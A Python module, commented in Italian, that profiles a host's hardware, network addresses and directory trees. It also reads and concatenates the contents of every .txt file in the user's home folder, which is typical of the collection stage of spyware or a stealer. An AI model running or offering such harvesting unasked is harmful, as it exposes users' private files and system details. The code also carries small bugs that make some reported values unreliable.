import codecs
import platform
import psutil
import GPUtil
import os
import ctypes

from datetime import datetime
from os import walk

IMPORTANT_DIRECTORIES_WINDOWS = ["C:\Windows\System32", "C:\Program Files", "C:\Program Files (x86)", "C:\pagefile.sys", "C:\System Volume Information", "C:\Windows\WinSxS", "C:\Program Files\RUXIM"]
IMPORTANT_DIRECTORIES_LINUX = ["/home", "/root", "/etc", "/opt", "/var", "/usr"]


# [CLASS DESCRIPTION] Ha il compito di permettere la lettura di alcune directory che altrimenti darebbero problemi, solo in Windows.
if os.name == "nt":
    class disable_file_system_redirection:
        _disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
        _revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection

        def __enter__(self):
            self.old_value = ctypes.c_long()
            self.success = self._disable(ctypes.byref(self.old_value))

        def __exit__(self, type, value, traceback):
            if self.success:
                self._revert(self.old_value)


def get_size(B):
    """
    Procedura per la rappresentazione della quantità espressa in bytes nel formato migliore (KB, MB, GB, etc.).
    :param B: rappresenta la quantità in byte da rappresentare nel giusto formato.
    :return: string
    """
    B = float(B)
    KB = float(1024)
    MB = float(KB ** 2)  # 1,048,576
    GB = float(KB ** 3)  # 1,073,741,824
    TB = float(KB ** 4)  # 1,099,511,627,776

    if B < KB:
        return '{0} {1}'.format(B, 'Bytes' if 0 == B > 1 else 'Byte')
    elif KB <= B < MB:
        return '{0:.2f} KB'.format(B / KB)
    elif MB <= B < GB:
        return '{0:.2f} MB'.format(B / MB)
    elif GB <= B < TB:
        return '{0:.2f} GB'.format(B / GB)
    elif TB <= B:
        return '{0:.2f} TB'.format(B / TB)


class InformationScavanger:
    def __init__(self):
        self.data = {}  # Rappresenta la collezione di dati nella sua interezza. E' composta da tante piccole "sotto-collezioni".
        self.fileSystem_string = ''

        # Sotto-collezioni che compongono data:
        self._generalInformation = {}
        self._generalInformation = {}
        self._cpuInformation = {}
        self._memoryInformation = {}
        self._diskInformation = {}
        self._networkInformation = {}
        self._gpuInformation = {}

    def systemRetrieval(self):
        """
        In tale procedura si raccolgono i dati che comporranno il file .json
        :return: None
        """
        self.gatherGeneralInfo()
        self.gatherCpuInfo()
        self.gatherMemoryInfo()
        self.gatherDiskUsage()
        self.gatherNetworkInfo()
        self.gatherGpuInfo()

        self.data['GeneralInformation'] = self._generalInformation
        self.data['CPUInformation'] = self._cpuInformation
        self.data['MemoryInformation'] = self._memoryInformation
        self.data['DiskInformation'] = self._diskInformation
        self.data['NetworkInformation'] = self._networkInformation
        self.data['GpuInformation'] = self._gpuInformation
        # self.data['FileInformation'] = self._fileInformation

        return self.data

    def gatherGeneralInfo(self):
        """
        Procedura nella quale si effettua il retrieval delle informazioni di base (generali) del sistema.
        Si compone la sotto-collezione '_generalInformation' da poi inserire in 'data'.
        :return: None
        """
        deviceName = platform.uname()
        bootTimeInfo = psutil.boot_time()
        bTime = datetime.fromtimestamp(bootTimeInfo)

        self._generalInformation['System'] = deviceName.system
        self._generalInformation['Node'] = deviceName.node
        self._generalInformation['Release'] = deviceName.release
        self._generalInformation['Version'] = deviceName.version
        self._generalInformation['Machine'] = deviceName.machine
        self._generalInformation['Processor'] = deviceName.processor
        self._generalInformation['Date'] = str(bTime.day) + '/' + str(bTime.month) + '/' + str(bTime.year)
        self._generalInformation['BootTime'] = str(bTime.hour) + ':' + str(bTime.minute) + ':' + str(bTime.second)

    def gatherCpuInfo(self):
        """
        Procedura nella quale si effettua il retrieval delle informazioni relative alla CPU.
        Si compone la sotto-collezione '_cpuInformation' da poi inserire in 'data'.
        :return: None
        """
        self._cpuInformation['PhysicalCores'] = str(psutil.cpu_count(logical=False))
        self._cpuInformation['TotalCores'] = str(psutil.cpu_count(logical=True))

        cpufrequencies = psutil.cpu_freq()

        self._cpuInformation['Max'] = str(cpufrequencies.max)
        self._cpuInformation['Min'] = str(cpufrequencies.min)
        self._cpuInformation['Current'] = str(cpufrequencies.max)
        self._cpuInformation['Percentage'] = str(psutil.cpu_percent())

        usage_core = ''
        for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
            usage_core = usage_core + '' + str(i + 1) + ') ' + str(percentage) + '%' + ' -- '

        self._cpuInformation['Cores'] = str(usage_core)

    def gatherMemoryInfo(self):
        """
        Procedura nella quale si effettua il retrieval delle informazioni relative all'utilizzo della memoria.
        Si compone la sotto-collezione '_memoryInformation' da poi inserire in 'data'.
        :return: None
        """
        mem = psutil.virtual_memory()
        swap = psutil.swap_memory()
        """
            psutil.virtual_memory() ritorna le statistiche relative alle informazioni sull'utilizzo della memoria come una namedtuple.
        """
        self._memoryInformation['Total'] = str(get_size(mem.total))
        self._memoryInformation['Available'] = str(get_size(mem.available))
        self._memoryInformation['Used'] = str(get_size(mem.used))
        self._memoryInformation['Percentage'] = str(get_size(mem.percent))
        self._memoryInformation['SwapTotal'] = str(get_size(swap.total))
        self._memoryInformation['SwapFree'] = str(get_size(swap.free))
        self._memoryInformation['SwapTotal'] = str(get_size(swap.total))
        self._memoryInformation['SwapUsed'] = str(get_size(swap.used))
        self._memoryInformation['SwapPercentage'] = str(get_size(swap.percent))

    def gatherDiskUsage(self):  # [FUNZIONANTE MA DA RIGUARDARE]
        """
        Procedura nella quale si effettua il retrieval delle informazioni relative all'utilizzo del disco.
        Si compone la sotto-collezione '_diskInformation' da poi inserire in 'data'.
        :return: None
        """

        # otteniamo tutte le partizioni.
        partition_Informations = psutil.disk_partitions()
        partitions = []

        for i, partition in enumerate(partition_Informations):
            partitions.append({
                'Device': partition.device,
                'Mountpoint': partition.mountpoint,
                'FStype': partition.fstype
            })

            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                continue

            partitions[i]['TotalSize'] = get_size(partition_usage.total)
            partitions[i]['Used'] = get_size(partition_usage.used)
            partitions[i]['Free'] = get_size(partition_usage.free)
            partitions[i]['Percentage'] = str(partition_usage.percent)

        # IO statistics a partire dal boot.
        disk_io = psutil.disk_io_counters()

        self._diskInformation['Partitions'] = partitions
        self._diskInformation['TotalRead'] = get_size(disk_io.read_bytes)
        self._diskInformation['TotalWrite'] = get_size(disk_io.read_bytes)

    def gatherNetworkInfo(self):  # [FUNZIONANTE MA DA RIGUARDARE E SISTEMARE IL COMMENTO DELLA PROCEDURA]
        """
        Procedura nella quale si effettua il retrieval delle informazioni relative alla rete.
        Si compone la sotto-collezione '_networkInformation' da poi inserire in 'data'.
        :return: None
        """

        # otteniamo le interfacce di rete (virtuali e fisiche)
        interface_address = psutil.net_if_addrs()
        addresses = []

        for interface_name, interface_addresses in interface_address.items():
            for address in interface_addresses:

                if str(address.family) == 'AddressFamily.AF_INET':
                    addresses.append({
                        'IP Address': address.address,
                        'Netmask': address.netmask,
                        'Broadcast IP': address.broadcast
                    })
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    addresses.append({
                        'MAC Address': address.address,
                        'Netmask': address.netmask,
                        'Broadcast MAC': address.broadcast
                    })

        # IO statistics a partire dal boot.
        net_io = psutil.net_io_counters()
        self._networkInformation['Active Address'] = addresses
        self._networkInformation['Total Bytes Sent'] = get_size(net_io.bytes_sent)
        self._networkInformation['Total Bytes Received'] = get_size(net_io.bytes_recv)

    def gatherGpuInfo(self):
        """
        Procedura nella quale si effettua il retrieval delle informazioni relative alla scheda grafica.
        Si compone la sotto-collezione '_gpuInformation' da poi inserire in 'data'.
        :return: None
        """

        device_gpu = GPUtil.getGPUs()
        list_gpu = []

        for gpu in device_gpu:
            list_gpu.append({
                'Id': gpu.id,
                'Name': gpu.name,
                'Load': f"{gpu.load * 100}%",
                'Free Memory': f"{gpu.memoryFree}MB",
                'Used Memory': f"{gpu.memoryUsed}MB",
                'Total Memory': f"{gpu.memoryTotal}MB",
                'Temperature': f"{gpu.temperature} °C",
                'UUID': gpu.uuid
            })

        self._gpuInformation['Gpu'] = list_gpu if len(list_gpu) > 0 else "No graphics card detected."

    def getPathName(self, path, root=None):
        if root is not None:
            path = os.path.join(root, path)
        result = os.path.basename(path)
        if os.path.islink(path):
            realpath = os.readlink(path)
            result = '%s -> %s' % (os.path.basename(path), realpath)
        return result

    def retriveUser(self) -> str:
        from pathlib import Path
        startPath: str = str(Path('~').expanduser())
        return self.retriveTextFiles(startPath)

    def fileSystemRetrival(self):
        """
        Procedura nella quale si effettua il retrieval delle informazioni relative al file system in cui il programma è eseguito.
        :return: None
        """

        if os.name == "nt":
            initial_path = '\\'
        else:
            initial_path = '/'

        self.fileSystem_string = self.retriveFiles()
        return self.fileSystem_string

    def visitTree(self, initial_path, depth=-1) -> str:
        return_string = ""
        prefix = 0
        if initial_path != '/':
            if initial_path.endswith('/'): initial_path = initial_path[
                                                          :-1]  # [:1] Modifica la stringa omettendo l'ultimo carattere a destra.
            prefix = len(initial_path)
        for (root, dirs, files) in walk(initial_path, topdown=False):
            """
            for name in files:
                return_string += os.path.join(root, name)
            for name in dirs:
                return_string += os.path.join(root, name)
            """
            livello = root[prefix:].count(
                os.sep)  # [_:] Modifica la stringa omettendo l'ultimo carattere a sinistra della quantità descritta dalla wildcard.
            if -1 < depth < livello: continue
            indent = ''
            if livello > 0:
                indent = '|   ' * (livello - 1) + '|-- '
            sub_indent = '|   ' * livello + '|-- '
            return_string += '{}{}/'.format(indent, os.path.basename(root)) + "\n"  # self.realname(root)

            for directory in dirs:
                if os.path.islink(os.path.join(root, directory)):
                    return_string += '{}{}'.format(sub_indent, self.getPathName(directory, root=root)) + "\n"

            for file in files:
                return_string += '{}{}'.format(sub_indent, self.getPathName(file, root=root)).encode('utf-8',
                                                                                                     'replace').decode() + "\n"
        return return_string

    def retriveTextFiles(self, initial_path) -> str:
        return_string = ""
        for root, dirs, files in os.walk(initial_path):
            for file in files:
                if file.endswith(".txt"):
                    return_string += os.path.join(root, file)
                    return_string += "\n#####################################################\n"
                    try:
                        with codecs.open(r"{}".format(os.path.join(root, file)), 'r', encoding="utf8", errors='ignore') as f:
                            return_string += '{}'.format(f.read()).encode('utf-8', 'replace').decode()
                    except PermissionError as p:
                        continue
                    return_string += "\n#####################################################\n"
        return return_string

    def retriveFiles(self):
        return_string = ""
        directories_list = []
        if os.name == "nt":
            directories_list = IMPORTANT_DIRECTORIES_WINDOWS
        else:
            directories_list = IMPORTANT_DIRECTORIES_LINUX

        for dir in directories_list:
            for (root, dirs, files) in walk(dir, topdown=False):
                for name in files:
                    return_string += os.path.join(root, name)
                for name in dirs:
                    return_string += os.path.join(root, name)

        return return_string